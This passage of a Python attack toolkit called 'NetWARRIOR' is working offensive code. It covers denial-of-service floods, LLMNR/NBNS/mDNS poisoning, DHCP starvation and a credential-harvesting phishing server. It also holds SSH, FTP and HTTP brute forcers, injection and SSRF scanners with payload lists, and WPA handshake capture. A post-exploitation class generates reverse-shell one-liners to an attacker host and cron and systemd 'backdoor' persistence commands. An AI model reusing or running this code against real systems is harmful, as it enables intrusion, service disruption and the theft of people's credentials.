                writer.write(f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n".encode())
                await writer.drain()
                socks.append(writer)
            except Exception:
                pass
        deadline = asyncio.get_running_loop().time() + duration
        while not self.engine._stop.is_set() and att.running and asyncio.get_running_loop().time() < deadline:
            for writer in socks[:]:
                try:
                    writer.write(b"\x00")
                    await writer.drain()
                    att.inc_sent(1)
                except Exception:
                    socks.remove(writer)
            await asyncio.sleep(5)
        for writer in socks:
            try: writer.close()
            except Exception: pass
        att.stop()
        return att

    async def http2_rapid_reset(self, target, port=80, duration=30, **kwargs):
        name = "http2_reset"
        att = self.registry.create(name)
        url = f"http://{target}:{port}/"
        self.log.add(f"HTTP/2 rapid reset {url}", tag="APP")
        async with aiohttp.ClientSession() as session:
            deadline = asyncio.get_running_loop().time() + duration
            while not self.engine._stop.is_set() and att.running and asyncio.get_running_loop().time() < deadline:
                try:
                    async with session.get(url, timeout=2) as resp:
                        await resp.read()
                    att.inc_sent(1)
                except Exception:
                    pass
                await asyncio.sleep(0.01)
        att.stop()
        return att

    async def websocket_flood(self, target, port=80, duration=30, sockets=20, **kwargs):
        name = "websocket_flood"
        att = self.registry.create(name)
        ws_url = f"ws://{target}:{port}/"
        self.log.add(f"WebSocket flood {ws_url}", tag="APP")
        async def worker():
            try:
                reader, writer = await asyncio.open_connection(target, port)
                req = f"GET / HTTP/1.1\r\nHost: {target}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n"
                writer.write(req.encode())
                await writer.drain()
                await asyncio.sleep(2)
                writer.close()
                await writer.wait_closed()
                att.inc_sent(1)
            except Exception:
                pass
        deadline = asyncio.get_running_loop().time() + duration
        tasks = []
        while not self.engine._stop.is_set() and att.running and asyncio.get_running_loop().time() < deadline:
            for _ in range(sockets):
                tasks.append(asyncio.create_task(worker()))
            await asyncio.sleep(0.1)
        await asyncio.gather(*tasks, return_exceptions=True)
        att.stop()
        return att

    # ---- Responder-style Poisoning ----
    async def llmnr_poison(self, target, domain="wpad.local", duration=30, **kwargs):
        att_name = f"llmnr_{target}"
        att = self.registry.create(att_name)
        self.log.add(f"LLMNR poison {domain} -> {target}", tag="POISON")
        def gen():
            while True:
                yield IP(src=target, dst="224.0.0.252") / UDP(sport=Utils.rand_port(), dport=5355) / DNS(
                    id=random.randint(0,65535), qr=1, aa=1,
                    qd=DNSQR(qname=domain),
                    an=DNSRR(rrname=domain, rdata=target, ttl=60)
                )
        await self.engine.send_loop(gen(), duration, 10, att_name)
        return att

    async def nbns_poison(self, target, name="WPAD", duration=30, **kwargs):
        att_name = f"nbns_{target}"
        att = self.registry.create(att_name)
        self.log.add(f"NBNS poison {name} -> {target}", tag="POISON")
        def gen():
            while True:
                payload = b"\x00\x00\x00\x00\x01\x00\x00\x01" + \
                          name.ljust(16).encode() + b"\x00" + b"\x00\x20\x00\x01" + \
                          socket.inet_aton(target)
                yield IP(src=target, dst="255.255.255.255") / UDP(sport=137, dport=137) / Raw(payload)
        await self.engine.send_loop(gen(), duration, 10, att_name)
        return att

    async def mdns_poison(self, target, domain="_http._tcp.local", duration=30, **kwargs):
        att_name = f"mdns_{target}"
        att = self.registry.create(att_name)
        self.log.add(f"mDNS poison {domain} -> {target}", tag="POISON")
        def gen():
            while True:
                yield IP(src=target, dst="224.0.0.251") / UDP(sport=5353, dport=5353) / DNS(
                    qr=1, aa=1,
                    qd=DNSQR(qname=domain),
                    an=DNSRR(rrname=domain, rdata=target)
                )
        await self.engine.send_loop(gen(), duration, 10, att_name)
        return att

    # ---- DHCP Starvation ----
    async def dhcp_starvation(self, target, duration=30, pps=10, **kwargs):
        name = "dhcp_starvation"
        att = self.registry.create(name)
        self.log.add(f"DHCP starvation {target}", tag="ATTACK")
        def gen():
            while True:
                mac = Utils.rand_mac()
                mac_bytes = bytes.fromhex(mac.replace(":", ""))
                chaddr = mac_bytes + b"\x00" * (16 - len(mac_bytes))
                yield Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") / \
                      IP(src="0.0.0.0", dst="255.255.255.255") / \
                      UDP(sport=68, dport=67) / \
                      Raw(b"\x01\x01\x06\x00" + b"\x00"*8 + chaddr + b"\x00"*10)
        await self.engine.send_loop(gen(), duration, pps, name, layer2=True)
        return att

    # ---- Social Engineering ----
    async def start_phishing_server(self, bind_ip="0.0.0.0", port=8080, credential_file="creds.txt", duration=60, **kwargs):
        from aiohttp import web
        name = "phishing"
        att = self.registry.create(name)
        self.log.add(f"Phishing server on {bind_ip}:{port}", tag="SOCIAL")
        creds = []

        async def handle_login(request):
            data = await request.post()
            username = data.get("username", "")
            password = data.get("password", "")
            creds.append((username, password))
            with open(credential_file, "a") as f:
                f.write(f"{username}:{password}\n")
            return web.Response(text="Login failed", status=401)

        app = web.Application()
        app.router.add_post("/login", handle_login)
        runner = web.AppRunner(app)
        await runner.setup()
        site = web.TCPSite(runner, bind_ip, port)
        await site.start()
        self.log.add(f"Phishing site running at http://{bind_ip}:{port}/login", tag="SOCIAL")
        await asyncio.sleep(duration)
        await runner.cleanup()
        att.stop()
        return att

    # ---- Cloud Recon ----
    async def cloud_recon(self, target_ips=None, duration=30, **kwargs):
        name = "cloud_recon"
        att = self.registry.create(name)
        self.log.add(f"Cloud reconnaissance (checking IPs)", tag="CLOUD")
        if target_ips is None:
            target_ips = [self.net.ip, self.net.gateway]
        results = {}
        async with aiohttp.ClientSession() as session:
            for ip in target_ips:
                try:
                    async with session.get(f"http://ip-api.com/json/{ip}", timeout=5) as resp:
                        data = await resp.json()
                        org = data.get("org", "")
                        if any(cloud in org.lower() for cloud in ["amazon", "azure", "google", "digitalocean", "linode"]):
                            results[ip] = org
                except Exception:
                    pass
                att.inc_sent(1)
        self.log.add(f"Cloud results: {results}", tag="CLOUD")
        att.stop()
        return att

    # ---- SSHTunnel (stub) ----
    async def ssh_tunnel(self, host, username, password=None, keyfile=None, remote_port=22, local_port=1080, duration=30, **kwargs):
        name = "ssh_tunnel"
        att = self.registry.create(name)
        self.log.add(f"SSH tunnel {host}:{remote_port} -> local:{local_port} (stub)", tag="TUNNEL")
        def tunnel_thread():
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                if password:
                    client.connect(host, port=remote_port, username=username, password=password, timeout=5)
                elif keyfile:
                    client.connect(host, port=remote_port, username=username, key_filename=keyfile, timeout=5)
                else:
                    self.log.add("SSH tunnel requires password or keyfile", level="error")
                    return
                self.log.add(f"SSH connection established (no forwarding)", tag="TUNNEL")
                time.sleep(duration)
                client.close()
            except Exception as e:
                self.log.add(f"SSH tunnel error: {e}", level="error")
                att.stop()
        loop = asyncio.get_running_loop()
        await loop.run_in_executor(None, tunnel_thread)
        att.stop()
        return att

    # ---- Passive Capture ----
    async def passive_capture(self, interface=None, duration=30, **kwargs):
        name = "passive_capture"
        att = self.registry.create(name)
        self.log.add(f"Passive capture on {interface or 'default'}", tag="CAPTURE")
        def packet_handler(pkt):
            att.inc_recv(1)
            if pkt.haslayer(Raw):
                data = pkt[Raw].load
                if b"Authorization: Basic" in data:
                    att.add_finding({"type": "Basic Auth", "data": data[:100]})
                    self.log.add("Found Basic Auth header", tag="CAPTURE")
        loop = asyncio.get_running_loop()
        await loop.run_in_executor(
            None,
            lambda: sniff(iface=interface, timeout=duration, prn=packet_handler, store=False)
        )
        att.stop()
        return att

    # ---- Network Performance ----
    async def network_perf(self, target, port=80, duration=30, **kwargs):
        name = "network_perf"
        att = self.registry.create(name)
        self.log.add(f"Network performance test {target}:{port}", tag="PERF")
        start = time.time()
        sent = 0
        recv = 0
        async with aiohttp.ClientSession() as session:
            while time.time() - start < duration:
                try:
                    async with session.get(f"http://{target}:{port}/", timeout=2) as resp:
                        data = await resp.read()
                        recv += len(data)
                        sent += 1
                        att.inc_sent(1)
                        att.inc_recv(1)
                except Exception:
                    pass
        self.log.add(f"Performance: {sent} requests, {Utils.human_size(recv)} received", tag="PERF")
        att.stop()
        return att

    # ---- External Wrappers ----
    async def nmap_wrapper(self, target, args="-sV", duration=30, **kwargs):
        name = "nmap_wrapper"
        att = self.registry.create(name)
        self.log.add(f"Running nmap on {target} with args {args}", tag="EXTERNAL")
        cmd = ["nmap", target] + args.split()
        try:
            process = await asyncio.create_subprocess_exec(
                *cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=duration)
            output = stdout.decode(errors='ignore')
            self.log.add(f"nmap output: {output[:200]}...", tag="EXTERNAL")
            att.add_finding({"stdout": output, "stderr": stderr.decode(errors='ignore')})
        except Exception as e:
            self.log.add(f"nmap error: {e}", level="error")
        att.stop()
        return att

    async def sqlmap_wrapper(self, url, args="--batch", duration=30, **kwargs):
        name = "sqlmap_wrapper"
        att = self.registry.create(name)
        self.log.add(f"Running sqlmap on {url} with args {args}", tag="EXTERNAL")
        cmd = ["sqlmap", "-u", url] + args.split()
        try:
            process = await asyncio.create_subprocess_exec(
                *cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE
            )
            stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=duration)
            output = stdout.decode(errors='ignore')
            self.log.add(f"sqlmap output: {output[:200]}...", tag="EXTERNAL")
            att.add_finding({"stdout": output, "stderr": stderr.decode(errors='ignore')})
        except Exception as e:
            self.log.add(f"sqlmap error: {e}", level="error")
        att.stop()
        return att

    # ---- FTP Brute (streaming, returns att) ----
    async def ftp_brute(self, host, user, wordlist_path, port=21, concurrency=20, **kwargs):
        name = "ftp_brute"
        att = self.registry.create(name)
        self.log.add(f"FTP brute {host}:{port} user {user}", tag="PENTEST")
        if not os.path.isfile(wordlist_path):
            self.log.add("Wordlist not found", level="error")
            att.stop()
            return att
        sem = asyncio.Semaphore(concurrency)
        found = None

        async def try_pass(pwd):
            nonlocal found
            if found:
                return
            async with sem:
                try:
                    reader, writer = await asyncio.open_connection(host, port)
                    await asyncio.wait_for(reader.readuntil(b"\n"), timeout=3)
                    writer.write(f"USER {user}\r\n".encode())
                    await writer.drain()
                    await asyncio.wait_for(reader.readuntil(b"\n"), timeout=3)
                    writer.write(f"PASS {pwd}\r\n".encode())
                    await writer.drain()
                    resp = await asyncio.wait_for(reader.readuntil(b"\n"), timeout=3)
                    if b"230" in resp:
                        found = pwd
                        self.log.add(f"FTP password found: {pwd}", tag="PENTEST")
                    writer.close()
                    await writer.wait_closed()
                except Exception:
                    pass

        with open(wordlist_path, 'r') as f:
            tasks = []
            for line in f:
                pwd = line.strip()
                if not pwd:
                    continue
                tasks.append(asyncio.create_task(try_pass(pwd)))
                if len(tasks) >= concurrency * 2:
                    await asyncio.gather(*tasks, return_exceptions=True)
                    tasks = []
                if found:
                    break
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)
        if found:
            att.add_finding({"password": found})
        att.stop()
        return att

    # ---- HTTP Basic Brute (streaming) ----
    async def http_basic_brute(self, url, user_wordlist, pass_wordlist, concurrency=20, **kwargs):
        name = "http_basic_brute"
        att = self.registry.create(name)
        self.log.add(f"HTTP Basic brute {url}", tag="PENTEST")
        if not os.path.isfile(user_wordlist) or not os.path.isfile(pass_wordlist):
            self.log.add("Wordlist not found", level="error")
            att.stop()
            return att
        found = None
        sem = asyncio.Semaphore(concurrency)

        async def try_auth(user, pwd):
            nonlocal found
            if found:
                return
            async with sem:
                try:
                    auth = aiohttp.BasicAuth(user, pwd)
                    async with aiohttp.ClientSession(auth=auth) as session:
                        async with session.get(url, timeout=5) as resp:
                            if resp.status == 200:
                                found = (user, pwd)
                                self.log.add(f"HTTP Basic credentials found: {user}:{pwd}", tag="PENTEST")
                except Exception:
                    pass

        with open(user_wordlist, 'r') as uf:
            for user in uf:
                user = user.strip()
                if not user:
                    continue
                with open(pass_wordlist, 'r') as pf:
                    tasks = []
                    for pwd in pf:
                        pwd = pwd.strip()
                        if not pwd:
                            continue
                        tasks.append(asyncio.create_task(try_auth(user, pwd)))
                        if len(tasks) >= concurrency * 2:
                            await asyncio.gather(*tasks, return_exceptions=True)
                            tasks = []
                        if found:
                            break
                    if tasks:
                        await asyncio.gather(*tasks, return_exceptions=True)
                if found:
                    break
        if found:
            att.add_finding({"credentials": found})
        att.stop()
        return att

    # ---- SSRF Scanner ----
    async def ssrf_scan(self, url, params, payloads=None, **kwargs):
        if payloads is None:
            payloads = ["http://169.254.169.254/latest/meta-data/", "http://localhost/", "http://127.0.0.1/"]
        name = "ssrf_scan"
        att = self.registry.create(name)
        self.log.add(f"SSRF scan on {url}", tag="PENTEST")
        found = []
        async with aiohttp.ClientSession() as session:
            for param in params:
                for payload in payloads:
                    data = {param: payload}
                    try:
                        async with session.get(url, params=data, timeout=5) as resp:
                            text = await resp.text()
                            if "aws" in text or "localhost" in text or "root" in text:
                                found.append({"param": param, "payload": payload, "response": text[:100]})
                    except Exception:
                        pass
        if found:
            att.add_finding({"vulnerabilities": found})
        att.stop()
        return att

    # ---- Command Injection Scanner ----
    async def cmd_injection_scan(self, url, params, payloads=None, **kwargs):
        if payloads is None:
            payloads = ["; ls", "| id", "&& whoami", "|| echo vulnerable"]
        name = "cmd_injection_scan"
        att = self.registry.create(name)
        self.log.add(f"Command injection scan on {url}", tag="PENTEST")
        found = []
        async with aiohttp.ClientSession() as session:
            for param in params:
                for payload in payloads:
                    data = {param: payload}
                    try:
                        async with session.get(url, params=data, timeout=5) as resp:
                            text = await resp.text()
                            if "uid=" in text or "root" in text or "vulnerable" in text:
                                found.append({"param": param, "payload": payload, "response": text[:100]})
                    except Exception:
                        pass
        if found:
            att.add_finding({"vulnerabilities": found})
        att.stop()
        return att

    # ---- Exploit Engine (Interactive SSH) ----
    async def exploit_ssh(self, host, port=22, username=None, password=None, keyfile=None, **kwargs):
        name = "exploit_ssh"
        att = self.registry.create(name)
        self.log.add(f"Launching SSH interactive shell to {host}:{port}", tag="EXPLOIT")
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            if password:
                client.connect(host, port=port, username=username, password=password, timeout=5)
            elif keyfile:
                client.connect(host, port=port, username=username, key_filename=keyfile, timeout=5)
            else:
                self.log.add("SSH shell requires credentials", level="error")
                att.stop()
                return att
            stdin, stdout, stderr = client.exec_command("id")
            output = stdout.read().decode()
            self.log.add(f"SSH command output: {output}", tag="EXPLOIT")
            att.add_finding({"output": output})
            client.close()
        except Exception as e:
            self.log.add(f"SSH exploit error: {e}", level="error")
        att.stop()
        return att

    # ---- Wireless Audit (Handshake capture) ----
    async def wireless_handshake_capture(self, iface="wlan0mon", bssid=None, duration=30, **kwargs):
        name = "wireless_handshake"
        att = self.registry.create(name)
        self.log.add(f"Capturing WPA handshake on {iface} for {duration}s", tag="WIFI")
        handshake = []
        def pkt_handler(pkt):
            if pkt.haslayer(EAPOL):
                handshake.append(pkt)
                self.log.add("Captured EAPOL frame", tag="WIFI")
                att.inc_recv(1)
        loop = asyncio.get_running_loop()
        await loop.run_in_executor(
            None,
            lambda: sniff(iface=iface, timeout=duration, prn=pkt_handler, store=False)
        )
        att.add_finding({"handshake_packets": len(handshake)})
        self.log.add(f"Captured {len(handshake)} EAPOL frames", tag="WIFI")
        att.stop()
        return att

    # ---- AutoEscalate (stub) ----
    async def auto_escalate(self, target, **kwargs):
        name = "auto_escalate"
        att = self.registry.create(name)
        self.log.add(f"Auto-escalate on {target} (stub)", tag="ESCALATE")
        att.stop()
        return att

    # ---- Traffic Monitor ----
    async def traffic_monitor(self, interface=None, duration=30, **kwargs):
        name = "traffic_monitor"
        att = self.registry.create(name)
        self.log.add(f"Traffic monitor on {interface or 'default'}", tag="MONITOR")
        stats = {"packets": 0, "bytes": 0, "start": time.time()}
        def pkt_handler(pkt):
            stats["packets"] += 1
            stats["bytes"] += len(pkt)
            att.inc_recv(1)
            att.inc_bytes_recv(len(pkt))
        loop = asyncio.get_running_loop()
        await loop.run_in_executor(
            None,
            lambda: sniff(iface=interface, timeout=duration, prn=pkt_handler, store=False)
        )
        elapsed = time.time() - stats["start"]
        self.log.add(f"Traffic: {stats['packets']} pkts, {Utils.human_size(stats['bytes'])} in {elapsed:.1f}s", tag="MONITOR")
        att.stop()
        return att

    # ---- Bandwidth Meter ----
    async def bandwidth_meter(self, duration=30, **kwargs):
        name = "bandwidth_meter"
        att = self.registry.create(name)
        self.log.add(f"Bandwidth meter for {duration}s", tag="MONITOR")
        import psutil
        counter = psutil.net_io_counters()
        start_bytes = counter.bytes_recv + counter.bytes_sent
        start_time = time.time()
        await asyncio.sleep(duration)
        counter = psutil.net_io_counters()
        end_bytes = counter.bytes_recv + counter.bytes_sent
        elapsed = time.time() - start_time
        rate = (end_bytes - start_bytes) / elapsed
        self.log.add(f"Bandwidth: {Utils.human_size(rate)}/s", tag="MONITOR")
        att.stop()
        return att

    # ---- Connection Table (returns findings) ----
    async def connection_table(self, **kwargs):
        name = "connection_table"
        att = self.registry.create(name)
        self.log.add("Showing connection table", tag="MONITOR")
        import psutil
        connections = psutil.net_connections()
        table = Table(title="Active Connections")
        table.add_column("FD", style="cyan")
        table.add_column("Family", style="green")
        table.add_column("Type", style="yellow")
        table.add_column("LAddr", style="magenta")
        table.add_column("RAddr", style="red")
        table.add_column("Status", style="blue")
        for conn in connections:
            if conn.laddr and conn.raddr:
                table.add_row(
                    str(conn.fd) if conn.fd else "-",
                    str(conn.family),
                    str(conn.type),
                    f"{conn.laddr.ip}:{conn.laddr.port}",
                    f"{conn.raddr.ip}:{conn.raddr.port}",
                    conn.status
                )
        from io import StringIO
        cap = StringIO()
        cap_con = Console(file=cap, highlight=False)
        cap_con.print(table)
        att.add_finding({"table": cap.getvalue()})
        att.stop()
        return att

    # ---- Chaos mode (stub) ----
    async def chaos_mode(self, target, duration=30, **kwargs):
        name = "chaos"
        att = self.registry.create(name)
        self.log.add(f"Chaos mode on {target} (stub)", tag="CHAOS")
        att.stop()
        return att

# ──────────────────────────────────────────────────────────────────────────────
# RECON
# ──────────────────────────────────────────────────────────────────────────────
class Recon:
    def __init__(self, config: Config, net: NetworkContext, log: LogBus):
        self.config = config
        self.net = net
        self.log = log
        self.loop = asyncio.get_running_loop()

    async def port_scan(self, host: str, ports: List[int], concurrency: int = 100, timeout: float = 2.0) -> List[int]:
        sem = asyncio.Semaphore(concurrency)
        async def scan_one(p):
            async with sem:
                try:
                    reader, writer = await asyncio.wait_for(asyncio.open_connection(host, p), timeout=timeout)
                    writer.close()
                    await writer.wait_closed()
                    return p
                except Exception:
                    return None
        tasks = [scan_one(p) for p in ports]
        results = await asyncio.gather(*tasks)
        return [p for p, res in zip(ports, results) if res is not None]

    async def fingerprint(self, ip: str) -> Dict:
        def _fingerprint():
            result = {"ip": ip, "ports": [], "banners": {}, "os": "Unknown", "ttl": None}
            try:
                pkt = IP(dst=ip)/ICMP()
                reply = sr1(pkt, timeout=2, verbose=0)
                if reply:
                    result["ttl"] = reply.ttl
                    if reply.ttl <= 64:
                        result["os"] = "Linux/Unix"
                    elif reply.ttl <= 128:
                        result["os"] = "Windows"
                    else:
                        result["os"] = "Network"
            except Exception:
                pass
            common = [21,22,23,25,53,80,110,443,445,3306,3389,5900,6379,8080,8443]
            open_ports = []
            for p in common:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1)
                    if s.connect_ex((ip, p)) == 0:
                        open_ports.append(p)
                        try:
                            s.send(b"\n")
                            banner = s.recv(256).decode(errors='replace')
                            result["banners"][p] = banner
                        except Exception:
                            pass
                    s.close()
                except Exception:
                    pass
            result["ports"] = open_ports
            return result
        return await self.loop.run_in_executor(None, _fingerprint)

    async def network_map(self, network: str, use_arp=True, use_ping=True) -> Dict:
        def _map():
            devices = {}
            net = ipaddress.IPv4Network(network, strict=False)
            hosts = list(net.hosts())
            if use_arp:
                try:
                    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=[str(h) for h in hosts[:100]]), timeout=2, verbose=0)
                    for _, recv in ans:
                        devices[recv.psrc] = {"ip": recv.psrc, "mac": recv.hwsrc, "hostname": Utils.get_hostname(recv.psrc)}
                except Exception:
                    pass
            if use_ping:
                for ip in hosts:
                    if str(ip) in devices:
                        continue
                    try:
                        pkt = IP(dst=str(ip))/ICMP()
                        reply = sr1(pkt, timeout=1, verbose=0)
                        if reply:
                            mac = Utils.get_mac(str(ip))
                            devices[str(ip)] = {"ip": str(ip), "mac": mac, "hostname": Utils.get_hostname(str(ip))}
                    except Exception:
                        pass
            return devices
        return await self.loop.run_in_executor(None, _map)

    def dns_lookup(self, domain, record_type="A", server=None):
        try:
            resolver = dns.resolver.Resolver()
            if server:
                resolver.nameservers = [server]
            answers = resolver.resolve(domain, record_type)
            return [str(r) for r in answers]
        except Exception as e:
            return [f"Error: {e}"]

    def dns_reverse(self, ip):
        try:
            name = dns.reversename.from_address(ip)
            answers = dns.resolver.resolve(name, "PTR")
            return [str(r) for r in answers]
        except Exception as e:
            return [f"Error: {e}"]

    def zone_transfer(self, domain, server):
        try:
            zone = dns.zone.from_xfr(dns.query.xfr(server, domain))
            return sorted(zone.nodes.keys())
        except Exception as e:
            return [f"Error: {e}"]

    async def vuln_scan(self, target: str) -> List[Dict]:
        fp = await self.fingerprint(target)
        results = []
        vuln_map = {
            21: "FTP anonymous login possible",
            22: "SSH weak passwords",
            23: "Telnet unencrypted",
            25: "SMTP open relay",
            80: "HTTP default pages",
            443: "HTTPS SSL weaknesses",
            3306: "MySQL default credentials",
            3389: "RDP BlueKeep (CVE-2019-0708)",
            5900: "VNC default passwords",
            6379: "Redis no auth",
            8080: "HTTP proxy misconfig",
            27017: "MongoDB no auth"
        }
        for port in fp.get("ports", []):
            if port in vuln_map:
                results.append({"port": port, "vulnerability": vuln_map[port], "severity": "Medium"})
        if 80 in fp.get("ports", []):
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(f"http://{target}", timeout=5) as resp:
                        text = await resp.text()
                        if "Welcome to nginx" in text or "Apache" in text:
                            results.append({"port": 80, "vulnerability": "Default web page", "severity": "Low"})
            except Exception:
                pass
        return results

# ──────────────────────────────────────────────────────────────────────────────
# PENTEST
# ──────────────────────────────────────────────────────────────────────────────
class Pentest:
    def __init__(self, config: Config, log: LogBus):
        self.config = config
        self.log = log
        self.loop = asyncio.get_running_loop()

    # ---- SSH Brute (streaming, timeout fix) ----
    async def ssh_brute(self, host, username, wordlist_path, port=22, concurrency=20):
        self.log.add(f"SSH brute {host}:{port} user {username}", tag="PENTEST")
        if not os.path.isfile(wordlist_path):
            self.log.add("Wordlist not found", level="error")
            return None
        sem = asyncio.Semaphore(concurrency)
        found = None

        async def try_pass(pwd):
            nonlocal found
            if found:
                return
            async with sem:
                try:
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    await self.loop.run_in_executor(
                        None,
                        lambda: client.connect(
                            host, port=port, username=username, password=pwd,
                            timeout=self.config.ssh_timeout
                        )
                    )
                    found = pwd
                    self.log.add(f"Found password: {pwd}", tag="PENTEST")
                    client.close()
                except Exception:
                    pass

        with open(wordlist_path, 'r') as f:
            tasks = []
            for line in f:
                pwd = line.strip()
                if not pwd:
                    continue
                tasks.append(asyncio.create_task(try_pass(pwd)))
                if len(tasks) >= concurrency * 2:
                    await asyncio.gather(*tasks, return_exceptions=True)
                    tasks = []
                if found:
                    break
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)
        return found

    async def web_sql_injection(self, url, params, payloads=None):
        if payloads is None:
            payloads = ["' OR '1'='1", "' UNION SELECT NULL--", "' AND SLEEP(5)--"]
        self.log.add(f"SQL injection scan on {url}", tag="PENTEST")
        found = []
        async with aiohttp.ClientSession() as session:
            for payload in payloads:
                for param in params:
                    data = {param: payload}
                    try:
                        async with session.get(url, params=data, timeout=5) as resp:
                            text = await resp.text()
                            if "SQL" in text or "error" in text or "mysql" in text:
                                found.append({"param": param, "payload": payload})
                    except Exception:
                        pass
        return found

    async def web_xss_scan(self, url, params, payloads=None):
        if payloads is None:
            payloads = ["<script>alert(1)</script>", "javascript:alert(1)"]
        found = []
        async with aiohttp.ClientSession() as session:
            for payload in payloads:
                for param in params:
                    data = {param: payload}
                    try:
                        async with session.get(url, params=data, timeout=5) as resp:
                            text = await resp.text()
                            if payload in text:
                                found.append({"param": param, "payload": payload})
                    except Exception:
                        pass
        return found

    async def web_lfi_scan(self, url, params, payloads=None):
        if payloads is None:
            payloads = ["../../etc/passwd", "../../../boot.ini"]
        found = []
        async with aiohttp.ClientSession() as session:
            for payload in payloads:
                for param in params:
                    data = {param: payload}
                    try:
                        async with session.get(url, params=data, timeout=5) as resp:
                            text = await resp.text()
                            if "root:" in text or "[boot loader]" in text:
                                found.append({"param": param, "payload": payload})
                    except Exception:
                        pass
        return found

# ──────────────────────────────────────────────────────────────────────────────
# POST-EXPLOIT
# ──────────────────────────────────────────────────────────────────────────────
class PostExploit:
    @staticmethod
    def reverse_shell_payload(host, port, shell="bash"):
        if shell == "bash":
            return f"bash -i >& /dev/tcp/{host}/{port} 0>&1"
        elif shell == "python":
            return f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
        elif shell == "nc":
            return f"nc {host} {port} -e /bin/sh"
        return ""
    @staticmethod
    def persistence_payload(method="cron", command="/bin/bash -i > /dev/tcp/...", interval="* * * * *"):
        if method == "cron":
            return f"echo '{interval} {command}' >> /etc/crontab"
        elif method == "systemd":
            return f"echo -e '[Service]\nExecStart={command}\n[Install]\nWantedBy=multi-user.target' > /etc/systemd/system/backdoor.service && systemctl enable backdoor"
        return ""

# ──────────────────────────────────────────────────────────────────────────────
# REPORT
# ──────────────────────────────────────────────────────────────────────────────
class Report:
    @staticmethod
    def generate_html(registry: AttackRegistry, log_bus: LogBus):
        html = "<html><head><title>NetWARRIOR Report</title></head><body><h1>Attack Report</h1>"
        html += f"<p>Total packets: {registry.total_packets()}</p>"
        html += "<ul>"
        for name, att in registry._attacks.items():
            html += f"<li>{name}: {att.packets_sent} packets, {att.errors} errors</li>"
        html += "</ul><h2>Logs</h2><pre>"
        for entry in log_bus.get(100):
            html += f"{entry['time']} [{entry['level']}] {entry['msg']}\n"
        html += "</pre></body></html>"
        return html

# ──────────────────────────────────────────────────────────────────────────────
# UI – FULL INTERACTIVE WITH WORKING COMMAND MODE AND OUTPUT PANEL
# ──────────────────────────────────────────────────────────────────────────────

# ──────────────────────────────────────────────────────────────────────────────
# UI  –  Adaptive, Font-Safe, Linux + Windows Compatible
#
# Design rules:
#   - Zero emojis: alignment breaks in non-emoji fonts and Windows CMD
#   - box.ROUNDED on modern terminals, box.ASCII on legacy Windows CMD
#   - box.SIMPLE for all inner tables (no side borders, universally safe)
#   - Terminal size detected at render time — layout adapts automatically
#   - Wide (>=100 cols): two-column body with live stats sidebar
#   - Narrow (<100 cols): single-column stacked layout
#   - Color is the primary visual hierarchy, not Unicode decoration
# ──────────────────────────────────────────────────────────────────────────────

class UI:

    # ── Colour palette (256-colour safe, tested Linux + Windows Terminal) ──────
    # Named constants so every render method uses the same values
    _C = {
        # Structure
        "border":       "bright_cyan",
        "border_dim":   "grey35",
        "header_logo":  "bold bright_cyan",
        "header_sub":   "grey50",
        "header_time":  "grey62",
        "nav_active":   "bold bright_white",
        "nav_inactive": "grey50",
        "separator":    "grey35",

        # Mode accent colours
        "menu":         "bright_cyan",
        "attack":       "bright_red",
        "recon":        "cyan",
        "pentest":      "bright_yellow",
        "report":       "bright_green",
        "command":      "bright_magenta",

        # Table content
        "key":          "bold bright_cyan",
        "desc":         "white",
        "example":      "grey50",
        "category":     "grey42",
        "heading":      "bold white",

        # Stats sidebar
        "stat_label":   "bright_cyan",
        "stat_value":   "bold white",
        "active_dot":   "bold bright_green",
        "idle_dot":     "grey42",

        # Log levels
        "log_time":     "grey50",
        "log_ok":       "bright_green",
        "log_err":      "bright_red",
        "log_warn":     "bright_yellow",
        "log_info":     "bright_blue",
        "log_tag":      "grey62",
        "log_msg":      "white",

        # Output / prompt
        "output":       "white",
        "output_dim":   "grey50",
        "prompt":       "bold bright_cyan",

        # Feedback
        "success":      "bold bright_green",
        "error":        "bold bright_red",
        "warn":         "bright_yellow",
        "info":         "bright_blue",
        "dim":          "grey50",
    }

    # Mode label map: mode_key -> (display_label, colour_key)
    _MODES = {
        "menu":    ("MENU",    "menu"),
        "attack":  ("ATTACK",  "attack"),
        "recon":   ("RECON",   "recon"),
        "pentest": ("PENTEST", "pentest"),
        "report":  ("REPORT",  "report"),
        "command": ("CMD",     "command"),
    }

    # Navigation entries: (key_char, label, colour_key, mode_target)
    _NAV = [
        ("1", "ATTACKS",  "attack",  "attack"),
        ("2", "RECON",    "recon",   "recon"),
        ("3", "PENTEST",  "pentest", "pentest"),
        ("4", "REPORT",   "report",  "report"),
        ("5", "CMD",      "command", "command"),
        ("S", "STOP",     "error",   None),
        ("Q", "QUIT",     "dim",     None),
    ]

    # ── Init ──────────────────────────────────────────────────────────────────
    def __init__(
        self,
        config: Config,
        net: NetworkContext,
        registry: AttackRegistry,
        log: LogBus,
        engine: AttackEngine,
    ):
        self.config   = config
        self.net      = net
        self.registry = registry
        self.log      = log
        self.engine   = engine
        self.attacks  = Attacks(engine, registry, log, net)
        self.recon    = Recon(config, net, log)
        self.pentest  = Pentest(config, log)

        self.running        = True
        self.mode           = "menu"
        self.cmd_output     = ""
        self._command_queue = asyncio.Queue()
        self._stdin_reader  = None

